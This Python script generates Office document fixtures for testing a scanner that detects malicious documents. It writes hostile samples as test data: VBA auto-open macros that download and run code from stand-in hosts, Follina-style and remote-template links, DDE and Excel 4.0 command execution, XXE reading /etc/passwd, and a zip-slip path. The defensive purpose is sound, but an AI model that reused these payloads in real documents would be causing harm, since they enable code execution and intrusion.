#!/usr/bin/env python3
"""Regenerate the office-document fixtures used to test scan_office().

Run from the repository root:

    python3 tests/fixtures/make_office_fixtures.py

Office documents are containers, and the interesting properties are in the
container, so every fixture is assembled by hand with the standard library:
OOXML and OpenDocument are ZIP files of XML parts; the legacy .doc / .xls /
.ppt formats and every embedded VBA project are OLE2 compound files (CFB), for
which this module carries a writer; a VBA module is stored compressed with the
MS-OVBA algorithm, for which it carries a real compressor (copy tokens
included, so the scanner's decompressor is exercised on more than literals).
Every payload is an inert stand-in: strings that trip a rule, never anything
that runs.

Output is deterministic (fixed timestamps), so regenerating gives a clean
`git diff`.

    --credential-docs OUTDIR   Also write documents holding a provider-shaped
                               token, read from $AITRANSIT_TEST_TOKEN. Used by
                               the test suite at run time so the repository
                               never holds a contiguous token.
"""
from __future__ import annotations

import base64
import io
import math
import os
import pathlib
import struct
import sys
import zipfile
import zlib

RULES = pathlib.Path(__file__).resolve().parent / "rules"
STAMP = (2020, 1, 1, 0, 0, 0)


# ═════════════════════════════════════════════════════════════════════════════
# ZIP
# ═════════════════════════════════════════════════════════════════════════════
def zbytes(entries: list[tuple[str, bytes]], first_stored: str | None = None) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=6) as z:
        for name, data in entries:
            zi = zipfile.ZipInfo(name, STAMP)
            zi.compress_type = zipfile.ZIP_STORED if name == first_stored else zipfile.ZIP_DEFLATED
            zi.external_attr = 0o644 << 16
            z.writestr(zi, data)
    return buf.getvalue()


def write(path: pathlib.Path, data: bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)


# ═════════════════════════════════════════════════════════════════════════════
# MS-OVBA: compression and the VBA project storage
# ═════════════════════════════════════════════════════════════════════════════
def ovba_compress(data: bytes) -> bytes:
    """MS-OVBA 2.4.1.3.19, with real copy tokens. Chunks are 4096 decompressed bytes."""
    out = bytearray([1])
    for start in range(0, len(data), 4096):
        chunk = data[start:start + 4096]
        body = bytearray()
        i = 0
        while i < len(chunk):
            flags, group = 0, bytearray()
            for bit in range(8):
                if i >= len(chunk):
                    break
                best_len = best_off = 0
                if i > 0:
                    bit_count = max(math.ceil(math.log2(i)) if i > 1 else 0, 4)
                    max_len = (0xFFFF >> bit_count) + 3
                    max_off = 1 << bit_count
                    for j in range(i - 1, max(-1, i - max_off - 1), -1):
                        k = 0
                        while i + k < len(chunk) and chunk[j + k] == chunk[i + k] and k < max_len:
                            k += 1
                        if k > best_len:
                            best_len, best_off = k, i - j
                if best_len >= 3:
                    bit_count = max(math.ceil(math.log2(i)) if i > 1 else 0, 4)
                    token = ((best_off - 1) << (16 - bit_count)) | (best_len - 3)
                    group += struct.pack("<H", token)
                    flags |= 1 << bit
                    i += best_len
                else:
                    group.append(chunk[i])
                    i += 1
            body.append(flags)
            body += group
        if len(body) > 4094:  # does not fit: store the chunk raw, padded to 4096
            raw = chunk + b"\x00" * (4096 - len(chunk))
            out += struct.pack("<H", 0x3000 | 4095) + raw
        else:
            out += struct.pack("<H", 0xB000 | (len(body) + 2 - 3)) + body
    return bytes(out)


def _rec(rid: int, payload: bytes) -> bytes:
    return struct.pack("<HI", rid, len(payload)) + payload


def vba_dir_stream(modules: list[tuple[str, int]]) -> bytes:
    """An uncompressed MS-OVBA `dir` stream. modules: (name, text_offset), all procedural except the first."""
    d = bytearray()
    d += _rec(0x01, struct.pack("<I", 3))                      # PROJECTSYSKIND: Win32
    d += _rec(0x02, struct.pack("<I", 0x409))                  # PROJECTLCID
    d += _rec(0x14, struct.pack("<I", 0x409))                  # PROJECTLCIDINVOKE
    d += _rec(0x03, struct.pack("<H", 1252))                   # PROJECTCODEPAGE
    d += _rec(0x04, b"VBAProject")                             # PROJECTNAME
    d += _rec(0x05, b"") + _rec(0x40, b"")                     # PROJECTDOCSTRING
    d += _rec(0x06, b"") + _rec(0x3D, b"")                     # PROJECTHELPFILEPATH
    d += _rec(0x07, struct.pack("<I", 0))                      # PROJECTHELPCONTEXT
    d += _rec(0x08, struct.pack("<I", 0))                      # PROJECTLIBFLAGS
    d += struct.pack("<HIIH", 0x09, 4, 1, 0)                   # PROJECTVERSION: size field 4, then 6 bytes
    d += _rec(0x0C, b"") + _rec(0x3C, b"")                     # PROJECTCONSTANTS
    d += _rec(0x0F, struct.pack("<H", len(modules)))           # PROJECTMODULES
    d += _rec(0x13, struct.pack("<H", 0xFFFF))                 # PROJECTCOOKIE
    for n, (name, off) in enumerate(modules):
        nm = name.encode("ascii")
        d += _rec(0x19, nm) + _rec(0x47, name.encode("utf-16-le"))
        d += _rec(0x1A, nm) + _rec(0x32, name.encode("utf-16-le"))
        d += _rec(0x1C, b"") + _rec(0x48, b"")
        d += _rec(0x31, struct.pack("<I", off))                # MODULEOFFSET = where the compressed source starts
        d += _rec(0x1E, struct.pack("<I", 0))
        d += _rec(0x2C, struct.pack("<H", 0xFFFF))
        d += _rec(0x22 if n == 0 else 0x21, b"")               # document / procedural module
        d += _rec(0x2B, b"")                                   # MODULE terminator
    d += _rec(0x10, b"")                                       # end of dir
    return bytes(d)


def vba_project(sources: dict[str, str], prefix: int = 24) -> dict:
    """Storage tree of a vbaProject.bin: PROJECT, VBA/{dir,_VBA_PROJECT,<modules>}."""
    names = list(sources)
    mods = {}
    for nm in names:
        code = sources[nm].replace("\n", "\r\n").encode("cp1252")
        mods[nm] = b"\x00" * prefix + ovba_compress(code)      # p-code stand-in, then the compressed source
    return {
        "PROJECT": ("ID=\"{00000000-0000-0000-0000-000000000000}\"\r\n" + "".join(
            ("Document=" if i == 0 else "Module=") + n + ("/&H00000000" if i == 0 else "") + "\r\n"
            for i, n in enumerate(names))).encode(),
        "VBA": {
            "dir": ovba_compress(vba_dir_stream([(n, prefix) for n in names])),
            "_VBA_PROJECT": b"\xcc\x61\xff\xff\x00\x00\x00",
            **mods,
        },
    }


# ═════════════════════════════════════════════════════════════════════════════
# CFB (OLE2 compound file) writer
# ═════════════════════════════════════════════════════════════════════════════
FREE, ENDOFCHAIN, FATSECT = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD


def cfb(tree: dict, clsids: dict | None = None) -> bytes:
    """tree: {name: bytes | {...}}. clsids: {path-tuple: 16 bytes}. A version-3 file (512-byte sectors)."""
    clsids = clsids or {}
    entries: list[dict] = []

    def add(name, kind, path):
        e = dict(name=name, kind=kind, path=path, left=FREE, right=FREE, child=FREE, start=ENDOFCHAIN, size=0, data=b"")
        entries.append(e)
        return len(entries) - 1

    def build(node: dict, parent_idx: int, path: tuple):
        kids = sorted(node, key=lambda n: (len(n), n.upper()))
        idxs = []
        for k in kids:
            v = node[k]
            i = add(k, 1 if isinstance(v, dict) else 2, path + (k,))
            if isinstance(v, dict):
                build(v, i, path + (k,))
            else:
                entries[i]["data"] = v
                entries[i]["size"] = len(v)
            idxs.append(i)
        for a, b in zip(idxs, idxs[1:]):
            entries[a]["right"] = b
        if idxs:
            entries[parent_idx]["child"] = idxs[0]

    root = add("Root Entry", 5, ())
    build(tree, root, ())

    # mini stream: every stream under 4096 bytes
    mini = bytearray()
    minifat: list[int] = []
    for e in entries:
        if e["kind"] == 2 and 0 < e["size"] < 4096:
            n = (e["size"] + 63) // 64
            e["start"] = len(minifat)
            for k in range(n):
                minifat.append(len(minifat) + 1 if k < n - 1 else ENDOFCHAIN)
            mini += e["data"] + b"\x00" * (n * 64 - e["size"])
    sectors: list[bytes] = []
    fat: list[int] = []

    def alloc(data: bytes) -> int:
        n = max(1, (len(data) + 511) // 512)
        first = len(sectors)
        for k in range(n):
            sectors.append(data[k * 512:(k + 1) * 512].ljust(512, b"\x00"))
            fat.append(len(sectors) if k < n - 1 else ENDOFCHAIN)
        return first

    for e in entries:
        if e["kind"] == 2 and e["size"] >= 4096:
            e["start"] = alloc(e["data"])
    entries[0]["size"] = len(mini)
    entries[0]["start"] = alloc(bytes(mini)) if mini else ENDOFCHAIN
    minifat_start, n_minifat = ENDOFCHAIN, 0
    if minifat:
        raw = b"".join(struct.pack("<I", x) for x in minifat)
        raw = raw.ljust(((len(raw) + 511) // 512) * 512, b"\xff")
        minifat_start = alloc(raw)
        n_minifat = len(raw) // 512

    def dir_entry(e):
        nm = e["name"].encode("utf-16-le") + b"\x00\x00"
        clsid = clsids.get(e["path"], b"\x00" * 16)
        return (nm.ljust(64, b"\x00") + struct.pack("<HBB", len(nm), e["kind"], 1)
                + struct.pack("<III", e["left"], e["right"], e["child"]) + clsid + struct.pack("<I", 0)
                + b"\x00" * 16 + struct.pack("<IQ", e["start"] if e["size"] else (ENDOFCHAIN if e["kind"] == 5 else 0), e["size"]))

    dirdata = b"".join(dir_entry(e) for e in entries)
    unused = (struct.pack("<64sHBB", b"", 0, 0, 1) + struct.pack("<III", FREE, FREE, FREE) + b"\x00" * 16
              + struct.pack("<I", 0) + b"\x00" * 16 + struct.pack("<IQ", 0, 0))
    while len(dirdata) % 512:
        dirdata += unused
    dir_start = alloc(dirdata)
    n_dir = len(dirdata) // 512
    # FAT sectors: iterate until the FAT covers itself
    n_fat = 1
    while True:
        total = len(sectors) + n_fat
        need = (total + 127) // 128
        if need == n_fat:
            break
        n_fat = need
    fat_start = len(sectors)
    for k in range(n_fat):
        fat.append(FATSECT)
    fat += [FREE] * (n_fat * 128 - len(fat))
    fatraw = b"".join(struct.pack("<I", x) for x in fat)
    for k in range(n_fat):
        sectors.append(fatraw[k * 512:(k + 1) * 512])
    difat = [fat_start + k for k in range(n_fat)] + [FREE] * (109 - n_fat)
    hdr = (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 16 + struct.pack("<HHHHH", 0x3E, 3, 0xFFFE, 9, 6)
           + b"\x00" * 6 + struct.pack("<IIIIIIIII", 0, n_fat, dir_start, 0, 4096, minifat_start, n_minifat, ENDOFCHAIN, 0)
           + b"".join(struct.pack("<I", x) for x in difat))
    return hdr + b"".join(sectors)


def ole10native(filename: str, payload: bytes) -> bytes:
    """The \\x01Ole10Native stream of an OLE Package object."""
    body = (struct.pack("<H", 2) + filename.encode() + b"\x00" + (r"C:\Temp\\" + filename).encode() + b"\x00"
            + struct.pack("<II", 0, len(r"C:\Temp\\" + filename) + 1) + (r"C:\Temp\\" + filename).encode() + b"\x00"
            + struct.pack("<I", len(payload)) + payload)
    return struct.pack("<I", len(body)) + body


# ═════════════════════════════════════════════════════════════════════════════
# Byte shapes
# ═════════════════════════════════════════════════════════════════════════════
def pe() -> bytes:
    return b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x80) + b"\x00" * 0x40 + b"PE\x00\x00" + b"\x00" * 64


ELF = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56
EQUATION_CLSID = bytes.fromhex("02CE020000000000C000000000000046")  # 0002CE02-0000-0000-C000-000000000046


# ═════════════════════════════════════════════════════════════════════════════
# OOXML skeletons
# ═════════════════════════════════════════════════════════════════════════════
NS_W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
NS_R = 'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
CT_HEAD = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'


def rels(items: list[tuple[str, str, str, bool]]) -> bytes:
    """items: (id, type-suffix or full type, target, external)."""
    out = [CT_HEAD, '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">']
    for rid, typ, tgt, ext in items:
        t = typ if typ.startswith("http") else f"{REL}/{typ}"
        out.append(f'<Relationship Id="{rid}" Type="{t}" Target="{tgt}"' + (' TargetMode="External"' if ext else "") + "/>")
    out.append("</Relationships>")
    return "".join(out).encode()


def docx(body: str = "<w:p><w:r><w:t>Quarterly notes.</w:t></w:r></w:p>", doc_rels=(), extra: dict | None = None,
         content_extra: str = "", main_ct: str = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
         doc_xml: str | None = None) -> bytes:
    parts = {
        "[Content_Types].xml": (CT_HEAD + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                                '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                                '<Default Extension="xml" ContentType="application/xml"/>'
                                '<Default Extension="png" ContentType="image/png"/>'
                                f'<Override PartName="/word/document.xml" ContentType="{main_ct}"/>{content_extra}</Types>').encode(),
        "_rels/.rels": rels([("rId1", "officeDocument", "word/document.xml", False)]),
        "word/document.xml": (doc_xml or (CT_HEAD + f'<w:document {NS_W} {NS_R}><w:body>{body}</w:body></w:document>')).encode(),
    }
    if doc_rels:
        parts["word/_rels/document.xml.rels"] = rels(list(doc_rels))
    parts.update(extra or {})
    return zbytes(list(parts.items()))


def xlsx(sheet_data: str = '<row r="1"><c r="A1"><v>1</v></c><c r="B1"><f>SUM(A1:A1)</f><v>1</v></c></row>',
         extra: dict | None = None, wb_rels=(), content_extra: str = "", sheets: str | None = None,
         main_ct: str = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml") -> bytes:
    sheets = sheets or '<sheet name="Sheet1" sheetId="1" r:id="rId1"/>'
    parts = {
        "[Content_Types].xml": (CT_HEAD + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                                '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                                '<Default Extension="xml" ContentType="application/xml"/>'
                                f'<Override PartName="/xl/workbook.xml" ContentType="{main_ct}"/>{content_extra}</Types>').encode(),
        "_rels/.rels": rels([("rId1", "officeDocument", "xl/workbook.xml", False)]),
        "xl/workbook.xml": (CT_HEAD + '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
                            f'{NS_R}><sheets>{sheets}</sheets></workbook>').encode(),
        "xl/_rels/workbook.xml.rels": rels([("rId1", "worksheet", "worksheets/sheet1.xml", False)] + list(wb_rels)),
        "xl/worksheets/sheet1.xml": (CT_HEAD + '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                                     f"<sheetData>{sheet_data}</sheetData></worksheet>").encode(),
    }
    parts.update(extra or {})
    return zbytes(list(parts.items()))


def pptx(text: str = "Roadmap", extra: dict | None = None, pres_rels=(), content_extra: str = "",
         main_ct: str = "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml") -> bytes:
    parts = {
        "[Content_Types].xml": (CT_HEAD + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                                '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                                '<Default Extension="xml" ContentType="application/xml"/>'
                                f'<Override PartName="/ppt/presentation.xml" ContentType="{main_ct}"/>{content_extra}</Types>').encode(),
        "_rels/.rels": rels([("rId1", "officeDocument", "ppt/presentation.xml", False)]),
        "ppt/presentation.xml": (CT_HEAD + '<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"/>').encode(),
        "ppt/_rels/presentation.xml.rels": rels([("rId1", "slide", "slides/slide1.xml", False)] + list(pres_rels)),
        "ppt/slides/slide1.xml": (CT_HEAD + '<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
                                  'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"><p:cSld><p:spTree>'
                                  f"<a:t>{text}</a:t></p:spTree></p:cSld></p:sld>").encode(),
    }
    parts.update(extra or {})
    return zbytes(list(parts.items()))


# ═════════════════════════════════════════════════════════════════════════════
# OpenDocument skeleton
# ═════════════════════════════════════════════════════════════════════════════
ODF_NS = ('xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
          'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" '
          'xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" '
          'xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" '
          'xmlns:xlink="http://www.w3.org/1999/xlink" '
          'xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" '
          'xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"')


def odf(body: str = "<text:p>Meeting minutes.</text:p>", scripts: str = "", extra: dict | None = None,
        mime: str = "application/vnd.oasis.opendocument.text", manifest_extra: str = "") -> bytes:
    kind = {"application/vnd.oasis.opendocument.text": "text", "application/vnd.oasis.opendocument.spreadsheet": "spreadsheet",
            "application/vnd.oasis.opendocument.text-template": "text"}.get(mime, "text")
    content = (CT_HEAD + f'<office:document-content {ODF_NS} office:version="1.3">{scripts}'
               f"<office:body><office:{kind}>{body}</office:{kind}></office:body></office:document-content>")
    manifest = (CT_HEAD + f'<manifest:manifest {ODF_NS} manifest:version="1.3">'
                f'<manifest:file-entry manifest:full-path="/" manifest:media-type="{mime}"/>'
                f'<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>{manifest_extra}</manifest:manifest>')
    parts = [("mimetype", mime.encode()), ("content.xml", content.encode()), ("META-INF/manifest.xml", manifest.encode())]
    parts += list((extra or {}).items())
    return zbytes(parts, first_stored="mimetype")


def basic_module(name: str, code: str) -> dict:
    esc = code.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    return {
        f"Basic/Standard/{name}.xml": (CT_HEAD + f'<script:module xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" '
                                       f'script:name="{name}" script:language="StarBasic">{esc}</script:module>').encode(),
        "Basic/Standard/script-lb.xml": (CT_HEAD + '<library:library xmlns:library="http://openoffice.org/2000/library" '
                                         f'library:name="Standard" library:readonly="false" library:passwordprotected="false">'
                                         f'<library:element library:name="{name}"/></library:library>').encode(),
        "Basic/script-lc.xml": (CT_HEAD + '<library:libraries xmlns:library="http://openoffice.org/2000/library">'
                                '<library:library library:name="Standard" xlink:href="$(USER)/basic/Standard/script.xlb/" '
                                'xlink:type="simple" library:link="false"/></library:libraries>').encode(),
    }


# ═════════════════════════════════════════════════════════════════════════════
# RTF
# ═════════════════════════════════════════════════════════════════════════════
def ole1_object(classname: str, payload: bytes = b"") -> bytes:
    """An OLE 1.0 embedded-object header: version, format, class name, topic and item (empty), then the data."""
    cn = classname.encode() + b"\x00"
    return (struct.pack("<II", 0x501, 2) + struct.pack("<I", len(cn)) + cn + struct.pack("<II", 0, 0)
            + struct.pack("<I", len(payload)) + payload)


def rtf(body: str) -> bytes:
    return ("{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0 Arial;}}" + body + "}").encode()


def rtf_object(classname: str, payload: bytes, flags: str = "\\objemb") -> str:
    hexa = ole1_object(classname, payload).hex()
    return "{\\object" + flags + "{\\*\\objclass " + classname + "}{\\*\\objdata " + hexa + "}}"


# ═════════════════════════════════════════════════════════════════════════════
# VBA sources
# ═════════════════════════════════════════════════════════════════════════════
VBA_EVIL_DOC = '''Attribute VB_Name = "ThisDocument"
Option Explicit
Sub AutoOpen()
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run "powershell -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')""", 0
End Sub
'''
VBA_EVIL_XLS = '''Attribute VB_Name = "ThisWorkbook"
Private Declare Function URLDownloadToFileA Lib "urlmon" (ByVal a As Long, ByVal u As String, ByVal f As String, ByVal r As Long, ByVal c As Long) As Long
Sub Workbook_Open()
    URLDownloadToFileA 0, "http://x.example/p.exe", Environ("TEMP") & "\\p.exe", 0, 0
    Shell Environ("TEMP") & "\\p.exe", vbHide
End Sub
'''
VBA_BENIGN = '''Attribute VB_Name = "ThisWorkbook"
Option Explicit
Sub Workbook_Open()
    Range("A1").Value = "Report generated"
    Range("A2").Value = Date
End Sub
'''
VBA_PLAIN = '''Attribute VB_Name = "Module1"
Function Square(x As Double) As Double
    Square = x * x
End Function
'''


def main() -> None:
    if "--credential-docs" in sys.argv:
        out = pathlib.Path(sys.argv[sys.argv.index("--credential-docs") + 1])
        token = os.environ["AITRANSIT_TEST_TOKEN"]
        write(out / "office_cred.docx", docx(f"<w:p><w:r><w:t>Deploy key: {token}</w:t></w:r></w:p>"))
        write(out / "office_cred.xlsx", xlsx(f'<row r="1"><c r="A1" t="inlineStr"><is><t>api.token={token}</t></is></c></row>'))
        return

    R = RULES
    # ── PASS: ordinary documents ────────────────────────────────────────────
    # Near-misses of nearly every rule below: a web hyperlink, a local attached
    # template (Word writes these constantly), prose about curl and passwords, a
    # formula with a pipe inside a string, an event listener bound to an INSTALLED
    # macro (ten of LibreOffice's own templates do this).
    write(R / "office_safe.docx", docx(
        '<w:p><w:hyperlink r:id="rId5"><w:r><w:t>docs</w:t></w:r></w:hyperlink></w:p>'
        "<w:p><w:r><w:t>Install with curl and pipe it to a shell: never do that. Use a password manager.</w:t></w:r></w:p>",
        doc_rels=[("rId5", "hyperlink", "https://example.com/docs", True),
                  ("rId6", "attachedTemplate", "file:///C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm", True),
                  ("rId7", "image", "media/image1.png", False)],
        extra={"word/media/image1.png": b"\x89PNG\r\n\x1a\n" + b"\x00" * 32}))
    write(R / "office_safe.xlsx", xlsx(
        '<row r="1"><c r="A1" t="str"><f>"a|b"</f><v>a|b</v></c><c r="B1"><f>SUM(A2:A9)</f><v>0</v></c>'
        '<c r="C1" t="str"><f>HYPERLINK("https://example.com","site")</f><v>site</v></c></row>'))
    write(R / "office_safe.pptx", pptx("Roadmap and milestones"))
    write(R / "office_safe.odt", odf(
        '<text:p><text:a xlink:href="https://example.com/">link</text:a></text:p>',
        scripts='<office:scripts><office:event-listeners><script:event-listener script:language="ooo:StarBasic" '
                'script:event-name="office:new" script:macro-name="application:Template.Correspondence.Main"/>'
                "</office:event-listeners></office:scripts>"))
    write(R / "office_safe.rtf", rtf("\\pard Meeting \\b notes\\b0 .\\par"))
    # Ambiguous extensions that are usually NOT office files: graphviz, gettext, a plain-text .doc.
    write(R / "office_graphviz.dot", b"digraph G {\n  a -> b;\n  b -> c;\n}\n")
    write(R / "office_gettext.pot", b'msgid ""\nmsgstr ""\n"Project-Id-Version: demo\\n"\n\nmsgid "Hello"\nmsgstr ""\n')
    write(R / "office_plain.doc", b"This is a plain text file with a .doc extension.\nIt has two lines.\n")
    write(R / "office_legacy_plain.doc", cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"Hello from a legacy document. " * 20,
                                              "1Table": b"\x00" * 64, "\x05SummaryInformation": b"\xfe\xff\x00\x00" + b"\x00" * 60}))

    # Larger than the test limits allow, ordinary at the defaults: 3.2 MB of text in one part, and a second part.
    write(R / "office_big.docx", docx(
        "<w:p><w:r><w:t>" + ("quarterly figures and commentary " * 100000) + "</w:t></w:r></w:p>",
        extra={"word/footnotes.xml": (CT_HEAD + f"<w:footnotes {NS_W}><w:footnote><w:p><w:r><w:t>second part</w:t></w:r></w:p></w:footnote></w:footnotes>").encode()}))

    # ── FAIL: external relationships ────────────────────────────────────────
    write(R / "office_remote_template.docx", docx(
        extra={"word/settings.xml": (CT_HEAD + f"<w:settings {NS_W} {NS_R}><w:attachedTemplate r:id=\"rId1\"/></w:settings>").encode(),
               "word/_rels/settings.xml.rels": rels([("rId1", "attachedTemplate", "http://attacker.example/evil.dotm", True)])}))
    write(R / "office_follina.docx", docx(doc_rels=[("rId9", "oleObject", "http://attacker.example/exploit.html!", True)]))
    write(R / "office_uri_handler.docx", docx(doc_rels=[
        ("rId9", "hyperlink", "ms-msdt:/id PCWDiagnostic /skip force /param &quot;IT_BrowseForFile=x&quot;", True)]))
    write(R / "office_unc_image.docx", docx(doc_rels=[("rId9", "image", "\\\\attacker.example\\share\\logo.png", True)]))
    write(R / "office_unc_hyperlink.docx", docx(doc_rels=[("rId9", "hyperlink", "file://fileserver.example/team/plan.docx", True)]))
    write(R / "office_remote_image.docx", docx(doc_rels=[("rId9", "image", "http://tracker.example/pixel.gif", True)]))

    # ── FAIL: DDE ───────────────────────────────────────────────────────────
    # The instruction is split across runs, as Word itself splits it: only a reader
    # that joins the field's fragments sees DDEAUTO.
    write(R / "office_dde.docx", docx(
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DD</w:instrText></w:r>'
        '<w:r><w:instrText>EAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>!Unexpected</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'))
    write(R / "office_dde_formula.xlsx", xlsx('<row r="1"><c r="A1"><f>cmd|\'/c calc\'!A0</f></c></row>'))
    write(R / "office_dde_link.xlsx", xlsx(extra={
        "xl/externalLinks/externalLink1.xml": (CT_HEAD + '<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                                               '<ddeLink ddeService="cmd" ddeTopic="/c calc.exe"><ddeItems><ddeItem name="x"/></ddeItems></ddeLink></externalLink>').encode()}))

    # ── macros in OOXML ─────────────────────────────────────────────────────
    vba_ct = '<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>'
    write(R / "office_macro_dangerous.docm", docx(
        doc_rels=[("rId8", "http://schemas.microsoft.com/office/2006/relationships/vbaProject", "vbaProject.bin", False)],
        extra={"word/vbaProject.bin": cfb(vba_project({"ThisDocument": VBA_EVIL_DOC}))}, content_extra=vba_ct,
        main_ct="application/vnd.ms-word.document.macroEnabled.main+xml"))
    write(R / "office_macro_benign.xlsm", xlsx(
        extra={"xl/vbaProject.bin": cfb(vba_project({"ThisWorkbook": VBA_BENIGN, "Module1": VBA_PLAIN}))},
        content_extra='<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    write(R / "office_macro_evil.xlsm", xlsx(
        extra={"xl/vbaProject.bin": cfb(vba_project({"ThisWorkbook": VBA_EVIL_XLS}))},
        content_extra='<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    write(R / "office_macro_ext.docx", docx(extra={"word/vbaProject.bin": cfb(vba_project({"Module1": VBA_PLAIN}))}, content_extra=vba_ct))
    # An Excel 4.0 macro sheet, hidden: no source to read, and no innocent reason for it.
    xlm = (CT_HEAD + '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>'
           '<row r="1"><c r="A1"><f>EXEC("cmd /c calc.exe")</f></c></row><row r="2"><c r="A2"><f>HALT()</f></c></row></sheetData></worksheet>')
    write(R / "office_xlm.xlsm", xlsx(
        sheets='<sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" state="veryHidden" r:id="rId2"/>',
        wb_rels=[("rId2", "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet", "macrosheets/sheet1.xml", False)],
        extra={"xl/macrosheets/sheet1.xml": xlm.encode()},
        content_extra='<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))

    # ── embedded objects ────────────────────────────────────────────────────
    pkg_exe = cfb({"\x01Ole10Native": ole10native("invoice.exe", pe()), "\x01CompObj": b"\x01\x00\xfe\xff" + b"Package\x00" * 2})
    write(R / "office_embedded_exe.docx", docx(
        doc_rels=[("rId9", "oleObject", "embeddings/oleObject1.bin", False)], extra={"word/embeddings/oleObject1.bin": pkg_exe}))
    write(R / "office_embedded_script.docx", docx(
        doc_rels=[("rId9", "package", "embeddings/payload.js", False)], extra={"word/embeddings/payload.js": b"WScript.Echo('x');\n"}))
    write(R / "office_embedded_object.docx", docx(
        doc_rels=[("rId9", "oleObject", "embeddings/oleObject1.bin", False)],
        extra={"word/embeddings/oleObject1.bin": cfb({"CONTENTS": b"chart data " * 40})}))
    inner = xlsx(extra={"xl/vbaProject.bin": cfb(vba_project({"ThisWorkbook": VBA_EVIL_XLS}))},
                 content_extra='<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>')
    write(R / "office_embedded_nested.docx", docx(
        doc_rels=[("rId9", "package", "embeddings/Microsoft_Excel_Worksheet.xlsx", False)],
        extra={"word/embeddings/Microsoft_Excel_Worksheet.xlsx": inner}))
    write(R / "office_activex.docx", docx(
        doc_rels=[("rId9", "http://schemas.microsoft.com/office/2006/relationships/activeXControl", "activeX/activeX1.xml", False)],
        extra={"word/activeX/activeX1.xml": (CT_HEAD + '<ax:ocx xmlns:ax="http://schemas.microsoft.com/office/2006/activeX" '
                                             'ax:classid="{8856F961-340A-11D0-A96B-00C04FD705A2}"/>').encode()}))
    write(R / "office_altchunk.docx", docx(
        doc_rels=[("rId9", "aFChunk", "afchunk.rtf", False)],
        extra={"word/afchunk.rtf": rtf(rtf_object("Equation.3", b"cmd /c calc.exe " + b"A" * 60))}))

    # ── container shape ─────────────────────────────────────────────────────
    write(R / "office_xxe.docx", docx(doc_xml=CT_HEAD + '<!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
                                      f"<w:document {NS_W}><w:body><w:p><w:r><w:t>&x;</w:t></w:r></w:p></w:body></w:document>"))
    write(R / "office_doctype.docx", docx(doc_xml=CT_HEAD + '<!DOCTYPE w:document>' + f"<w:document {NS_W}><w:body><w:p/></w:body></w:document>"))
    write(R / "office_zipslip.docx", docx(extra={"../../tmp/aitransit_escape.dotm": b"x"}))
    write(R / "office_elf.docx", ELF + b"\x00" * 200)
    write(R / "office_text.docx", b"This is not a Word document, just some text.\n")
    write(R / "office_empty.docx", b"")
